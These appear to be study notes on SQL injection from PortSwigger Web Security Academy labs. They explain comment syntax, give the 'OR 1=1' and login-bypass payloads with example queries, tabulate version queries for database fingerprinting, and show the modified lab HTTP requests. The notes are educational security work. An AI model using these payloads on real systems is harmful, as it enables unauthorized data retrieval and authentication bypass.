# Overview

## Concepts

Definition by [portswigger.net](https://portswigger.net/web-security/sql-injection):

> SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
>
> In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

I find important to mark the difference between `UNION SQLi` and `Blind SQLi`:

- UNION attacks: you can retrieve data from different database tables
- Blind SQLi: the results of a query you control are not returned in the application's responses.

## Key points

In SQL the characters `--` start a comment.

```sql
--  https://insecure-website.com/products?category=Gifts'-- 
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 
```

As you can see from the highlighted code, what follows the two dashes is interpreted as a comment.

## Retrieve hidden data

the simplest way to retrieve hidden data using a SQLi is to use `OR 1=1`. For example:

```sql
--  https://insecure-website.com/products?category=Gifts'+OR+1=1-- 
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The query right above select the products where category is equal to 'Gifts' or where 1=1. Since 1 is always equal to 1, we get all the products, even if they weren't released (released = 0).

## Subvert application logic

We can use a SQLi injection to "subvert" application logic, i.e. the change how the app. behaves. For example, we can bypass the login:

```sql
-- turn this
SELECT * FROM users WHERE username = 'admin' AND password = 'strongpassword'

-- into this
SELECT * FROM users WHERE username = 'admin'--' AND password = 'strongpassword'
```

### Examining the database

Since there exist different types of database, you can specific commands the get determine what database you're trying to attack.

Database type | Query
--------------|------
Microsoft, MySQL | SELECT | @@version
Oracle | SELECT * FROM v$version
PostgreSQL | SELECT version()

## Labs

### Retrieving hidden data

> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

What I had to do was to turn the following request:

```http
GET /filter?category=Gifts HTTP/1.1
# output omitted for brevity
```

Into this one:

```http
GET /filter?category=Gifts'+OR+1=1 HTTP/1.1
# output omitted for brevity
```

Note the difference:

```diff
< GET /filter?category=Gifts
---
> GET /filter?category=Gifts'+OR+1=1 HTTP/1.1
```

### Subvert application logic

> SQL injection vulnerability allowing login bypass

Original request:

```http
POST /login HTTP/1.1
Host: ace31f011ec49bad806a1d3d00f300f2.web-security-academy.net
# output omitted for brevity

csrf=cHkQYSTk6VN6hFL8tiBJpOuS1KSOfTrG&username=administrator&password=password
```

To bypass the login function, I had to turn it into this:

```http
POST /login HTTP/1.1
Host: ace31f011ec49bad806a1d3d00f300f2.web-security-academy.net
# output omitted for brevity

csrf=cHkQYSTk6VN6hFL8tiBJpOuS1KSOfTrG&username=administrator'--&password=password
```

Note the difference:

```diff
< csrf=cHkQYSTk6VN6hFL8tiBJpOuS1KSOfTrG&username=administrator&password=password
---
> csrf=cHkQYSTk6VN6hFL8tiBJpOuS1KSOfTrG&username=administrator'--&password=password
```

## Sources

[1]: [What is SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection)

